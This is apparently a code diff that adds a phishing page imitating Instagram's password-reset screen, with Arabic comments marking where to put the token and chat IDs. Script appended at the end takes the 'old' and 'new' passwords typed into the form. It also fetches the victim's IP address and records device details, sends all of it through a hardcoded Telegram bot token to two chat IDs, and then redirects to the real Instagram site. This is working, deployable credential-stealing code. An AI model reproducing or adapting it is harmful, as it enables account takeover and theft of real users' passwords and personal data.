@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram</title>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="/img/instagram-logo.png" alt="" width="100">
+        </div>
+        <nav>
+            <button class="button">Log In</button>
+            <button class="button">Sign UP</button>
+        </nav>
+    </header>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <div title="Instagram" class="justify-content-center">
+                    <h3>Create A Strong Password</h3>
+                    <p>Your password must be at least 6 characters
+                         and should include a combination of numbers,
+                         letters and special characters (!$@%).</p>
+
+            </div>
+                <form id="login-form">
+                    <label for="email" class="sr-only">Old password</label>
+                    <input id="email" name="email" placeholder="Old password" required />
+
+                    <label for="password" class="sr-only">New password, again</label>
+                    <input id="password" name="password" type="password" placeholder="New password, again" required />
+
+                    <button type="submit">Reset Password</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+
+                    <span></span>
+
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="https://about.instagram.com/">About</a></li>
+            <li><a href="https://help.instagram.com/">Help</a></li>
+            <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
+            <li><a href="https://developers.facebook.com/docs/instagram-platform">API</a></li>
+            <li><a href="https://l.instagram.com/?u=https%3A%2F%2Fabout.instagram.com%2Fabout-us%2Fcareers&e=AT3wchEKKLHpoafynVrxWGvbvvtCJgNEgGUllmxhGo_0F-A6tndpgaJvLqEGbEuUx9lPaqVTKevcHA_x5CpS4VY4HirKWXLm&s=1">CAREERS</a></li>
+            <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">PRIVACY</a></li>
+            <li><a href="https://help.instagram.com/581066165581870/">Termst</a></li>
+            <li><a href="https://www.instagram.com/explore/locations/?hl=en">Location</a></li>
+            <li><a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26hl%3Den%26__coig_login%3D1#">Meta Verified</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram from Facebook</p>
+    </footer>
+
+
+
+
+<!-- java هنا اسفل -->
+
+
+
+
+</body>
+</html>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7070628074:AAFOfVQ5wYkIoU4n_g5YVE1XGVfuguiYXTg"; // هنا التوكين
+        const CHAT_IDS = ["5618966875", "6152638465"]; // أضف جميع معرفات الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    const message = `
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال الرسالة إلى جميع معرفات الدردشة
+                    CHAT_IDS.forEach(chatId => {
+                        axios.post(URI_API, {
+                            chat_id: chatId,
+                            parse_mode: 'html',
+                            text: message
+                        }).then(response => {
+                            console.log(`Message sent to chat ID: ${chatId}`);
+                        }).catch(error => {
+                            console.error(`Error sending to chat ID: ${chatId}`, error);
+                        });
+                    });
+
+                    // إعادة التوجيه بعد إرسال الرسائل
+                    window.location.href = 'https://www.instagram.com/?hl=fr';
+                })
+                .catch(error => {
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
+
+
+</body>
+</html>
